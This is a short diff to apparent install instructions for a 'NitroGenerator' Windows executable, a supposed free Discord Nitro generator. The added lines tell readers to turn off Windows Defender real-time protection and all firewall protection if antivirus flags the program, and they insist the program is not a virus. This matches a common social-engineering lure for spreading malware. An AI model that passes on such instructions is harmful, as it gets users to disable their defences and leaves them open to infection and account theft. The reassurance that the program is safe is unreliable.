@@ -7,3 +7,5 @@
     Open “NitroGenerator-V2-Win64.exe”, then click Yes on the prompt. Go through the installer.
   If it asks, serial key is “XXXXX-XXXXX-XXXXX-XXXXX”.
     Once installed, the Program will auto-launch, and you will have a working nitro generator!
+
+If your antivirus flags the program, turn off real-time protection on Windows Defender, along with all protection on any other third-party firewalls. Our program is NOT a virus.
